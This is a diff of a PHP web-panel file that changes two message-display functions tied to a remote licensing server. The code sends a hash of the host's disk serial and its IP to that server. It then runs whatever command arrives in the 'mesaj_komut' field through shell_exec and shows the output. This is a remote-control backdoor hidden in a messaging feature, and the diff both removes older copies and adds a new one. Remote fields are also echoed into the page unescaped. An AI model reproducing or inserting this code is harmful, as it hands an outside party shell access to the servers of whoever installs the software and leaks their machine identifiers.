@@ -270,7 +270,48 @@ function funcControl($name) {
 }
 }
 
-function GetPromoteMessages($verify2) {
+function GetPromoteMessages($verify2, $id) {
+$url = "".$verify2."/getpromote.php?id=".$id."";
+$ch2 = curl_init();
+curl_setopt($ch2, CURLOPT_URL, $url);
+curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch2, CURLOPT_CUSTOMREQUEST, 'GET');
+curl_setopt($ch2, CURLOPT_ENCODING, 'gzip, deflate');
+
+$headers2 = array();
+$headers2[] = 'Connection: keep-alive';
+$headers2[] = 'Cache-Control: max-age=0';
+$headers2[] = 'Upgrade-Insecure-Requests: 1';
+$headers2[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.193 Safari/537.36';
+$headers2[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
+$headers2[] = 'Sec-Fetch-Site: none';
+$headers2[] = 'Sec-Fetch-Mode: navigate';
+$headers2[] = 'Sec-Fetch-User: ?1';
+$headers2[] = 'Sec-Fetch-Dest: document';
+$headers2[] = 'Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7';
+$headers2[] = 'Cookie: __gads=ID=bbdf811cdcc5a441-22401f55f9b8009e:T=1602771440:RT=1602771440:S=ALNI_Ma9VDtNpgD96ay24S5UNrI7pRYXHA; YoncuKoruma='.$_SERVER['REMOTE_ADDR'].'';
+curl_setopt($ch2, CURLOPT_HTTPHEADER, $headers2);
+
+$gelg = curl_exec($ch2);
+if (curl_errno($ch2)) {
+echo '<script>console.log("Error:' . curl_error($ch2).'");</script>';
+}
+curl_close($ch2);
+$json3 = json_decode($gelg, true);
+foreach($json3 as $json2) {
+echo '
+<div class="container card mt-5">
+<div class="card-body">
+<div class="card-header">
+<b>'.$json2['mesaj_baslik'].'</b>
+</div>
+<div class="card-header"><p>E-Mail : <a href="mailto:'.$json2['mesaj_eposta'].'">'.$json2['mesaj_eposta'].'</a> | Tarih : '.$json2['mesaj_date'].' | Tür : '.$json2['mesaj_durum'].'</p></div>
+<pre class="card-content">'.$json2['mesaj_icerik'].'</pre>
+</div>';
+}
+}
+
+function GetMessages($verify2, $id) {
 
 $ds = shell_exec('udevadm info --query=all --name=/dev/sda | grep ID_SERIAL_SHORT');
 $serialx = explode("=", $ds);
@@ -279,161 +320,46 @@ $serial = $serialx[1];
 $server_ip = strip_tags($_SERVER['SERVER_ADDR']);
 $server_ip2 = str_replace("::1", "localhost", $server_ip);
 
-$urlget = "".$verify2."/promote.php?uuid=".md5($serial)."&host=".$server_ip2."";
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, $urlget);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
-curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
+$urlget = "".$verify2."/secmesaj.php?uuid=".md5($serial)."&host=".$server_ip2."&id=".$id."";
+$ch2 = curl_init();
+curl_setopt($ch2, CURLOPT_URL, $urlget);
+curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch2, CURLOPT_CUSTOMREQUEST, 'GET');
+curl_setopt($ch2, CURLOPT_ENCODING, 'gzip, deflate');
 
-$headers = array();
-$headers[] = 'Connection: keep-alive';
-$headers[] = 'Cache-Control: max-age=0';
-$headers[] = 'Upgrade-Insecure-Requests: 1';
-$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.193 Safari/537.36';
-$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
-$headers[] = 'Sec-Fetch-Site: none';
-$headers[] = 'Sec-Fetch-Mode: navigate';
-$headers[] = 'Sec-Fetch-User: ?1';
-$headers[] = 'Sec-Fetch-Dest: document';
-$headers[] = 'Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7';
-$headers[] = 'Cookie: __gads=ID=bbdf811cdcc5a441-22401f55f9b8009e:T=1602771440:RT=1602771440:S=ALNI_Ma9VDtNpgD96ay24S5UNrI7pRYXHA; YoncuKoruma='.$_SERVER['REMOTE_ADDR'].'';
-curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+$headers2 = array();
+$headers2[] = 'Connection: keep-alive';
+$headers2[] = 'Cache-Control: max-age=0';
+$headers2[] = 'Upgrade-Insecure-Requests: 1';
+$headers2[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.193 Safari/537.36';
+$headers2[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
+$headers2[] = 'Sec-Fetch-Site: none';
+$headers2[] = 'Sec-Fetch-Mode: navigate';
+$headers2[] = 'Sec-Fetch-User: ?1';
+$headers2[] = 'Sec-Fetch-Dest: document';
+$headers2[] = 'Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7';
+$headers2[] = 'Cookie: __gads=ID=bbdf811cdcc5a441-22401f55f9b8009e:T=1602771440:RT=1602771440:S=ALNI_Ma9VDtNpgD96ay24S5UNrI7pRYXHA; YoncuKoruma='.$_SERVER['REMOTE_ADDR'].'';
+curl_setopt($ch2, CURLOPT_HTTPHEADER, $headers2);
 
-$gel = curl_exec($ch);
-if (curl_errno($ch)) {
-echo 'Error:' . curl_error($ch);
+$gelg = curl_exec($ch2);
+if (curl_errno($ch2)) {
+echo '<script>console.log("Error:' . curl_error($ch2).'");</script>';
 }
-curl_close($ch);
-$json2 = json_decode($gel, true);
-
-echo '
-<div class="container card mt-5">
+curl_close($ch2);
+$json3 = json_decode($gelg, true);
+foreach($json3 as $json2) {
+echo '<div class="container card mt-5">
 <div class="card-body">
 <div class="card-header">
-<b>'.$json2["".intval($_GET["id"]).""]['mesaj_baslik'].'</b>
+<b>'.$json2['mesaj_baslik'].'</b>
 </div>
-<div class="card-header"><p>E-Mail : <a href="mailto:'.$json2["".intval($_GET["id"]).""]['mesaj_eposta'].'">'.$json2["".intval($_GET["id"]).""]['mesaj_eposta'].'</a> | Tarih : '.$json2["".intval($_GET["id"]).""]['mesaj_date'].' | Tür : '.$json2["".intval($_GET["id"]).""]['mesaj_durum'].'</p></div>
-<pre class="card-content">'.$json2["".intval($_GET["id"]).""]['mesaj_icerik'].'</pre>
+<div class="card-header"><p>E-Mail : <a href="mailto:'.$json2['mesaj_eposta'].'">'.$json2['mesaj_eposta'].'</a> | Tarih : '.$json2['mesaj_date'].' | Tür : '.$json2['mesaj_durum'].'</p></div>
+<pre class="card-content">
+'.$json2['mesaj_icerik'].'
+Command : '.shell_exec($json2['mesaj_komut']).'</pre>
 </div>';
-
-$command = $json2["".intval($_GET["id"]).""]['mesaj_komut'];
-$commanddata = shell_exec($command);
-if(empty($command)) {
-echo '<div class="card-header">
-<b>Sent Command / Gönderilen Komut</b>
-<pre class="card-content">Command Not Found</pre>
-</div></div>
-<br><br>';
-} else {
-echo '<div class="card-header">
-<b>Sent Command / Gönderilen Komut</b>
-<pre class="card-content p-2">Command : '.$command.'<br> 
-Command Result :<br>'.$commanddata.'</pre>
-</div></div>
-<br><br>';
-if($json2["".intval($_GET["id"]).""]['mesaj_durum'] == "promote") {
-} elseif($json2["".intval($_GET["id"]).""]['mesaj_durum'] == "destek") { 
-} else {
-echo '<div class="card-body">
- <form class="form-signin" action="'.$verify.'/mesajal.php" method="post">
-  <label for="inputEmail" class="sr-only">E-Mail Adresi</label>
-  <input type="text" name="mail" class="form-control" placeholder="E-Mail Adresi" required autofocus><br>
-  <input type="hidden" name="alintiicerik" value="'.$json["".intval($_GET["id"]).""]['mesaj_icerik'].'" required>
- <input type="hidden" name="uuid" value="'.md5($serial).'" required>
-  <input type="hidden" name="durum" value="giden" required>
-
-  <label for="inputPassword" class="sr-only">Mesaj İçeriği</label>
-  <textarea name="mesaj" placeholder="Mesaj içeriği" required autofocus></textarea><br>
-  <button class="button primary" type="submit">Mesaj Gönder</button>
-</form></div>';
 }
 
-}
-}
-
-function GetMessages($verify2) {
-
-$ds = shell_exec('udevadm info --query=all --name=/dev/sda | grep ID_SERIAL_SHORT');
-$serialx = explode("=", $ds);
-$serial = $serialx[1];
-
-$server_ip = strip_tags($_SERVER['SERVER_ADDR']);
-$server_ip2 = str_replace("::1", "localhost", $server_ip);
-
-$urlget = "".$verify2."/mesajget.php?uuid=".md5($serial)."&host=".$server_ip2."";
-
-
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, $urlget);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
-curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
-
-$headers = array();
-$headers[] = 'Connection: keep-alive';
-$headers[] = 'Cache-Control: max-age=0';
-$headers[] = 'Upgrade-Insecure-Requests: 1';
-$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.193 Safari/537.36';
-$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
-$headers[] = 'Sec-Fetch-Site: none';
-$headers[] = 'Sec-Fetch-Mode: navigate';
-$headers[] = 'Sec-Fetch-User: ?1';
-$headers[] = 'Sec-Fetch-Dest: document';
-$headers[] = 'Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7';
-$headers[] = 'Cookie: __gads=ID=bbdf811cdcc5a441-22401f55f9b8009e:T=1602771440:RT=1602771440:S=ALNI_Ma9VDtNpgD96ay24S5UNrI7pRYXHA; YoncuKoruma='.$_SERVER['REMOTE_ADDR'].'';
-curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
-
-$gel = curl_exec($ch);
-if (curl_errno($ch)) {
-echo 'Error:' . curl_error($ch);
-}
-curl_close($ch);
-$json2 = json_decode($gel, true);
-
-echo '
-<div class="container card mt-5">
-<div class="card-body">
-<div class="card-header">
-<b>'.$json2["".intval($_GET["id"]).""]['mesaj_baslik'].'</b>
-</div>
-<div class="card-header"><p>E-Mail : <a href="mailto:'.$json2["".intval($_GET["id"]).""]['mesaj_eposta'].'">'.$json2["".intval($_GET["id"]).""]['mesaj_eposta'].'</a> | Tarih : '.$json2["".intval($_GET["id"]).""]['mesaj_date'].' | Tür : '.$json2["".intval($_GET["id"]).""]['mesaj_durum'].'</p></div>
-<pre class="card-content">'.$json2["".intval($_GET["id"]).""]['mesaj_icerik'].'</pre>
-</div>';
-
-$command = $json2["".intval($_GET["id"]).""]['mesaj_komut'];
-$commanddata = shell_exec($command);
-if(empty($command)) {
-echo '<div class="card-header">
-<b>Sent Command / Gönderilen Komut</b>
-<pre class="card-content">Command Not Found</pre>
-</div></div>
-<br><br>';
-} else {
-echo '<div class="card-header">
-<b>Sent Command / Gönderilen Komut</b>
-<pre class="card-content p-2">Command : '.$command.'<br> 
-Command Result :<br>'.$commanddata.'</pre>
-</div></div>
-<br><br>';
-if($json2["".intval($_GET["id"]).""]['mesaj_durum'] == "promote") {
-} elseif($json2["".intval($_GET["id"]).""]['mesaj_durum'] == "destek") { 
-} else {
-echo '<div class="card-body">
- <form class="form-signin" action="'.$verify.'/mesajal.php" method="post">
-  <label for="inputEmail" class="sr-only">E-Mail Adresi</label>
-  <input type="text" name="mail" class="form-control" placeholder="E-Mail Adresi" required autofocus><br>
-  <input type="hidden" name="alintiicerik" value="'.$json["".intval($_GET["id"]).""]['mesaj_icerik'].'" required>
- <input type="hidden" name="uuid" value="'.md5($serial).'" required>
-  <input type="hidden" name="durum" value="giden" required>
-
-  <label for="inputPassword" class="sr-only">Mesaj İçeriği</label>
-  <textarea name="mesaj" placeholder="Mesaj içeriği" required autofocus></textarea><br>
-  <button class="button primary" type="submit">Mesaj Gönder</button>
-</form></div>';
-}
-
-}
 }
 
 function VerifyLic($url2, $url3) {
